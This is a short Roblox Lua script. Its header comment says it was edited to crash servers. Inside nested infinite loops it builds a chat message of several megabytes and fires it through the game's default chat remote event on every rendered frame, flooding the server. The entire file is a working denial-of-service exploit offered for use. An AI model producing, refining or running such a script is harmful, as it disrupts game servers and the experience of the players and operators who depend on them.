--script edited by settings#2006 to CRASH servers.
while true do                
	wait()
while true do            
	wait()
for i=1, 100 do 
local msg = "/e "..string.rep("do the same with this put whatever you want.   ",301056)
game:GetService("RunService").RenderStepped:Connect(function()
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
end)
end
end
end